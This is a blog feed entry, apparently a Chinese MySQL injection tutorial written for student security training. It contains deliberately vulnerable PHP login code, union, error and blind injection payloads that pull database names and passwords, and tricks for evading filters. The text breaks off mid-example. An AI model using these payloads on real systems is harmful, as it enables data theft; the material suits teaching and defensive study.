<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yunen&#39;s Blog</title>
  
  <subtitle>Focus On Web Safety!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.0x002.com/"/>
  <updated>2020-04-29T21:02:32.582Z</updated>
  <id>https://www.0x002.com/</id>
  
  <author>
    <name>Yunen</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>对MYSQL注入相关内容及部分Trick的归类小结</title>
    <link href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.0x002.com/2020/对MYSQL注入相关内容及部分Trick的归类小结/</id>
    <published>2020-02-06T06:00:00.000Z</published>
    <updated>2020-04-29T21:02:32.582Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于：<a href="https://xz.aliyun.com/t/7169" target="_blank" rel="noopener">https://xz.aliyun.com/t/7169</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在给学校的社团成员进行web安全方面的培训，由于在mysql注入这一块知识点挺杂的，入门容易，精通较难，网上相对比较全的资料也比较少，大多都是一个比较散的知识点，所以我打算将我在学习过程中遇到的关于的mysql注入的内容给全部罗列出来，既方便个人之后的复习，也方便后人查找相关资料。</p><p>本文部分内容可能会直接截取其他大牛的文章，截取的内容我都会进行声明处理。如有侵权，请发email联系我(asp-php#foxmail.com)删除。</p><h1 id="Mysql简介"><a href="#Mysql简介" class="headerlink" title="Mysql简介"></a>Mysql简介</h1><p>在正式讲解mysql注入的内容前，我认为还是有必要说明一下什么是mysql、mysql的特点是什么等内容，这些东西看起来可能对注入毫无帮助，开始却能很好的帮助我们学习，融会贯通。</p><blockquote><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种<strong>关联数据库管理系统</strong>，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL是<strong>开源</strong>的，所以你不需要支付额外的费用。</li><li>MySQL使用<strong>标准的 SQL 数据语言</strong>形式。</li><li>MySQL可以运行于多个系统上，并且<strong>支持多种语言</strong>。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL<strong>对PHP有很好的支持</strong>，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL<strong>支持大型数据库</strong>，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL是<strong>可以定制的</strong>，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。</li></ul><p>引自：<a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">Mysql教程 | 菜鸟教程</a></p></blockquote><p>一个完整的mysql管理系统结构通常如下图：</p><p><img src="/img/loading.gif" alt="数据库结构简易图" class="lazyload" data-src="https://blog-img-cos.lfcqjd.com/article/MysqlSQLi/databaseStruct.png"></p><p>可以看到，mysql可以管理<strong>多个数据库</strong>，一个数据库可以包含<strong>多个数据表</strong>，而一个数据表有含有<strong>多条字段</strong>，一行数据正是<strong>多个字段同一行</strong>的一串数据。</p><h1 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h1><p>简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。</p><p>举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username = @$_POST[<span class="string">'username'</span>];</span><br><span class="line">$password = @$_POST[<span class="string">'password'</span>];</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述代码将模拟一个web应用程序进行登录操作。若登录成功，则返回success，否则，返回fail。</p><p>通常正常用户进行登录的sql语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure><p>其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符错，被赋值给前边的字段来当做整条select查询语句的筛选条件。</p><p>若用户输入的$username为<code>admin&#39;#</code>，$password为<code>123</code>。那么拼接到sql语句中将得到如下结果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username = <span class="string">'admin'</span><span class="comment">#' and password='123'</span></span><br></pre></td></tr></table></figure><p>这里的<code>#</code>是单行注释符，可以将后边的内容给注释掉。那么此条语句的语义将发生了变化，用户可以不需要判断密码，只需一个用户名，即可完成登录操作，这与开发者的初衷相悖。</p><h1 id="Mysql注入-入门"><a href="#Mysql注入-入门" class="headerlink" title="Mysql注入-入门"></a>Mysql注入-入门</h1><p>我们知道，在数据库中，常见的对数据进行处理的操作有：<strong>增、删、查、改</strong>这四种。</p><p>每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。</p><ul><li>增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为: <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</li><li>删。删除数据。简单结构为: <code>DELETE table_name WHERE condition</code>。</li><li>查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：<code>SELECT columns_name FROM table_name WHERE condition</code>。</li><li>改。有修改/更新数据。简单结构为:<code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</li></ul><p>PS：以上SQL语句中，系统关键字全部进行了大写处理。</p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><p>mysql的查询语句完整格式如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> | <span class="keyword">DISTINCT</span> | <span class="keyword">DISTINCTROW</span> ]</span><br><span class="line">      [<span class="keyword">HIGH_PRIORITY</span>]</span><br><span class="line">      [<span class="keyword">STRAIGHT_JOIN</span>]</span><br><span class="line">      [<span class="keyword">SQL_SMALL_RESULT</span>] [<span class="keyword">SQL_BIG_RESULT</span>] [<span class="keyword">SQL_BUFFER_RESULT</span>]</span><br><span class="line">      [<span class="keyword">SQL_CACHE</span> | SQL_NO_CACHE] [<span class="keyword">SQL_CALC_FOUND_ROWS</span>]</span><br><span class="line">    select_expr [, select_expr ...]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name | expr | <span class="keyword">position</span>&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> | <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [<span class="keyword">LIMIT</span> &#123;[<span class="keyword">offset</span>,] <span class="keyword">row_count</span> | <span class="keyword">row_count</span> <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [<span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'file_name'</span></span><br><span class="line">        [<span class="built_in">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">      | <span class="keyword">INTO</span> <span class="keyword">DUMPFILE</span> <span class="string">'file_name'</span></span><br><span class="line">      | <span class="keyword">INTO</span> var_name [, var_name]]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> | <span class="keyword">LOCK</span> <span class="keyword">IN</span> <span class="keyword">SHARE</span> <span class="keyword">MODE</span>]]</span><br></pre></td></tr></table></figure><p>通常注入点发生在where_condition处，并不是说唯有此处可以注入，其他的位置也可以，只是我们先将此处的注入当做例子来进行讲解，之后会逐渐降到其他的位置该如何进行注入。</p><p>对于<code>SELECT</code>语句，我们通常分其为两种情况：有回显和无回显。</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>什么叫有回显？别急，我们来举个例子。</p><p>当我们点击一篇文章阅读时，其URL为<code>read.php?id=1</code>，我们可以很容易地猜出其SQL语句可能为<code>select * from articles where id=&#39;$id&#39;</code>。</p><p>这时候页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。</p><p>对于有回显的情况来说，我们通常使用<strong>联合查询注入法</strong>。</p><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>其作用就是，在原来查询条件的基础上，通过系统关键字<code>union</code>从而拼接上我们自己的<code>select</code>语句，后个<code>select</code>得到的结果将拼接到前个<code>select</code>的结果后边。如：前个<code>select</code>得到2条数据，后个<code>select</code>得到1条数据，那么后个<code>select</code>的数据将作为<strong>第3条</strong>拼接到第一个<code>select</code>返回的内容中，其字段名将<strong>按照位置</strong>关系进行继承。</p><p>如：<code>正常查询语句 union select columns_name from (database.)table_name where condition</code></p><p>这里需要注意的是：</p><ul><li>若回显仅支持一行数据的话，记得<strong>让前边正常的查询语句返回的结果为空</strong>。</li><li>使用union select进行拼接时，注意<strong>前后两个select语句的返回的字段数必须相同</strong>，否则无法拼接。</li></ul><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。</p><p>与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。</p><p>对于无回显的情况，我们通常可用两种方法进行注入：<strong>报错注入</strong>与<strong>盲注</strong>。</p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>什么是报错注入，简单的说，就是有些特殊的函数，会在其报错信息里可能会返回其参数的值。</p><p>我们可以利用这一特性，在其参数放入我们想要得到的数据，通常使用子查询的方法实现，最后让其报错并输出结果。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常语句 (where | and) exp(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br><span class="line"></span><br><span class="line">正常语句 (where | and) updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>若网站设置了无报错信息返回，那么在<strong>不直接返回数据+不返回报错信息</strong>的情况下，盲注便几乎成了最后一种直接注入取数据的方法了。</p><p>其中，盲注分成<strong>布尔盲注</strong>和<strong>时间盲注</strong>。</p><h5 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h5><p>对于布尔盲注来说，其使用的场景在于：<strong>对真/假条件返回的内容很容易区分</strong>。</p><p>比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。</p><p>如：<code>正常语句 (where | and) if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,1,0)</code></p><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>相比较于布尔盲注，时间盲注依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p><p>使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。</p><p>简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。</p><p>如：<code>正常语句（where | and）if(substr((select password from users where username=&#39;admin&#39;),1,1)=&#39;a&#39;,sleep(3),1)</code></p><p>最后总结一下: </p><p>常见注入方法有三种：<code>联合查询注入、报错注入、盲注</code>，其中：</p><ul><li>有回显：<strong>三种均可使用</strong>，推荐使用联合查询注入。</li><li>无回显：<strong>报错注入+盲注可用</strong>。</li></ul><p>对于时间成本来说：联合查询注入&lt;报错注入&lt;&lt;盲注。</p><p>通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。</p><h3 id="三大注入的基本步骤"><a href="#三大注入的基本步骤" class="headerlink" title="三大注入的基本步骤"></a>三大注入的基本步骤</h3><h4 id="联合查询注入步骤"><a href="#联合查询注入步骤" class="headerlink" title="联合查询注入步骤"></a>联合查询注入步骤</h4><p>1) 首先，先确定字段数量。</p><p>使用<code>order/group by</code>语句。通过往后边拼接数字，可确定字段数量，<strong>若大于，则页面错误/无内容，若小于或等于，则页面正常</strong>。若错误页与正常页一样，更换报错注入/盲注。</p><p>2) 第二步，判断页面回显数据的字段位置。</p><p>使用<code>union select 1,2,3,4,x...</code> 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。</p><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的<code>select</code>查询条件返回结果为空即可。</li><li>注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条<code>select</code>语句的方法之一。</li></ul><p>3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。</p><p>首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。</p><h5 id="若Mysql版本-lt-5-0"><a href="#若Mysql版本-lt-5-0" class="headerlink" title="若Mysql版本&lt;5.0"></a>若Mysql版本&lt;5.0</h5><p>简单的说，由于mysql的低版本缺乏系统库<strong>information_schema</strong>，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠<strong>猜</strong>来解决。</p><p>直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。</p><p>若知道仅表名而不知道列(字段)名：</p><p>可通过以下payload：</p><ul><li>若多字段：select `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)a</li><li>若单字段：select *,1,2,xxx from table_name</li></ul><h5 id="若Mysql版本-gt-5-0"><a href="#若Mysql版本-gt-5-0" class="headerlink" title="若Mysql版本&gt;=5.0"></a>若Mysql版本&gt;=5.0</h5><p>首先去一个名为<strong>information_schema</strong>的数据库里的<strong>shemata</strong>数据表查询<strong>全部数据库名</strong>。</p><p>若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。</p><p>在information_schema的一个名为<strong>tables</strong>的数据表中存着全部的<strong>数据表信息</strong>。</p><p>其中，<strong>table_name 字段保存其名称</strong>，<strong>table_schema保存其对应的数据库名</strong>。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema&#x3D;database();</span><br></pre></td></tr></table></figure><p>上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。</p><p>接着通过其表名，查询该表的所有字段名，有时也称列名。</p><p>通过information_schema库下的<strong>columns</strong>表可查询对应的数据库/数据库表含有的字段名。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;(table_name)#此处的表名为字符串型，也通过十六进制表示</span><br></pre></td></tr></table></figure><p>知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Union select 1,2,column_name,4,xxx from (database_name.)table_name</span><br></pre></td></tr></table></figure><p>简单的说，<strong>查库名-&gt;查表名-&gt;查字段名-&gt;查数据</strong></p><h3 id="盲注步骤："><a href="#盲注步骤：" class="headerlink" title="盲注步骤："></a>盲注步骤：</h3><p>核心：利用<strong>逻辑代数连接词/条件函数</strong>，让页面<strong>返回的内容/响应时间</strong>与正常的页面不符。</p><h4 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a><em>布尔盲注：</em></h4><p>首先通过页面对于永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>如：<code>select * from users where username=$username</code>，其作用设定为<em>判断用户名是否存在</em>。</p><p>通常仅返回<strong>存在/不存在</strong>，两个结果。</p><p>这时候我们就不能使用联合查询法注入，因为页面显示SQL语句返回的内容，只能使用<strong>盲注法/报错注入法</strong>来注出数据。</p><p>我们在将语句注入成：<code>select * from users where username=$username or (condition)</code></p><p>若后边拼接的条件为真的话，那么整条语句的where区域将变成<strong>永真</strong>条件。</p><p>那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。</p><p>利用这一特性，我们的condition为：length(database())&gt;8 即可用于判断数据库名长度</p><p>除此之外，还可：ascii(substr(database(),1,1))&lt;130 用二分法快速获取数据名(逐字判断)</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;nouser or length(database())&gt;8</span><br><span class="line">select * from users where username&#x3D;nouser or ascii(substr(database(),1,1))&lt;130</span><br></pre></td></tr></table></figure><h4 id="时间盲注："><a href="#时间盲注：" class="headerlink" title="时间盲注："></a><em>时间盲注：</em></h4><p>通过判断页面<strong>返回内容的响应时间差异</strong>进行条件判断。</p><p>通常可利用的产生时间延迟的函数有：<strong>sleep()、benchmark()</strong>，还有许多进行<strong>复杂运算的函数</strong>也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p><p>如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。</p><p>在上述语句中，我们拼接语句，变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;$username (and | or) if(length(database())&gt;8,sleep(3),1)</span><br></pre></td></tr></table></figure><p>如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。</p><p>若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。</p><h3 id="报错注入步骤："><a href="#报错注入步骤：" class="headerlink" title="报错注入步骤："></a>报错注入步骤：</h3><p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出。</p><p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p><p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>等</p><p>如：<code>select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)</code></p><p>因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。</p><p>将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。</p><p>注意：</p><ul><li>报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。</li><li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。</li></ul><h2 id="增、删、改"><a href="#增、删、改" class="headerlink" title="增、删、改"></a>增、删、改</h2><p>可简单当做无回显的Select语句进行注入。值得注意的是，通常增<code>insert</code>处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。</p><h1 id="Mysql注入-进阶"><a href="#Mysql注入-进阶" class="headerlink" title="Mysql注入-进阶"></a>Mysql注入-进阶</h1><p>到目前为止，我们讲了Mysql注入的基本入门，那么接下来我将会花费大部分时间介绍我学习mysql注入遇到的一些知识点。</p><h2 id="常见防御手段绕过"><a href="#常见防御手段绕过" class="headerlink" title="常见防御手段绕过"></a>常见防御手段绕过</h2><p>在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。</p><p>简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。</p><p>若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。</p><p>举个例子：程序过滤掉了<code>union</code>这一关键词，我们可以使用<code>ununionion</code>来绕过。</p><p>PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。</p><h3 id="and-or-被过滤-拦截"><a href="#and-or-被过滤-拦截" class="headerlink" title="and/or 被过滤/拦截"></a>and/or 被过滤/拦截</h3><ol><li>双写<code>anandd、oorr</code></li><li>使用运算符代替<code>&amp;&amp;、||</code></li><li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li><li>其他方法，如：<code>?id=1^(condition)</code></li></ol><h3 id="空格被过滤-拦截"><a href="#空格被过滤-拦截" class="headerlink" title="空格被过滤/拦截"></a>空格被过滤/拦截</h3><ol><li>多层括号嵌套</li><li>改用+号</li><li>使用注释代替</li><li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符可也代替空格</li></ol><p>如：<code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h3 id="括号被过滤-拦截"><a href="#括号被过滤-拦截" class="headerlink" title="括号被过滤/拦截"></a>括号被过滤/拦截</h3><ul><li>order by 大小比较盲注</li></ul><h3 id="逗号被过滤-拦截"><a href="#逗号被过滤-拦截" class="headerlink" title="逗号被过滤/拦截"></a>逗号被过滤/拦截</h3><ol><li>改用盲注</li><li>使用join语句代替</li><li><code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></li></ol><h3 id="其他系统关键字被过滤-拦截"><a href="#其他系统关键字被过滤-拦截" class="headerlink" title="其他系统关键字被过滤/拦截"></a>其他系统关键字被过滤/拦截</h3><ol><li>双写绕过关键字过滤</li><li>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li></ol><h3 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤/拦截/转义"></a>单双引号被过滤/拦截/转义</h3><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。</li><li>不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。</li></ol><h3 id="数字被过滤-拦截"><a href="#数字被过滤-拦截" class="headerlink" title="数字被过滤/拦截"></a>数字被过滤/拦截</h3><blockquote><p>下表摘自<a href="https://wooyun.js.org/drops/MySQL注入技巧.html" target="_blank" rel="noopener">MySQL注入技巧</a></p></blockquote><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数、字</th><th>代替字符</th><th>数、字</th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10\A</td><td>ceil((pi()+pi())*pi())</td><td>20\K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11\B</td><td>ceil(ceil(pi())*version())</td><td>21\L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12\C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22\M</td></tr><tr><td>floor(pi())、~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13\D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23\N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14\E</td><td>ceil(pi())*ceil(version())</td><td>24\O</td></tr><tr><td>floor(version()) //注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15\F</td><td>floor(pi()*(version()+pi()))</td><td>25\P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16\G</td><td>floor(version()*version())</td><td>26\Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17\H</td><td>ceil(version()*version())</td><td>27\R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18\I</td><td>ceil(pi()<em>pi()</em>pi()-pi())</td><td>28\S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19\J</td><td>floor(pi()<em>pi()</em>floor(pi()))</td><td>29\T</td></tr></tbody></table><h2 id="编码转换产生的问题"><a href="#编码转换产生的问题" class="headerlink" title="编码转换产生的问题"></a>编码转换产生的问题</h2><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么是宽字节注入？下面举个例子来告诉你。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1:3307"</span>, <span class="string">"root"</span>, <span class="string">"root"</span>, <span class="string">"db"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$conn) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connection failed: "</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;query(<span class="string">"set names 'gbk';"</span>);</span><br><span class="line">$username = addslashes(@$_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes(@$_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"select * from users where username = '$username' and password='$password';"</span>;</span><br><span class="line">$rs = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">echo</span> $sql.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>($rs-&gt;fetch_row())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是开头的例子，只不过加了点料。</p><figure class="highlight php"><table><tr><td 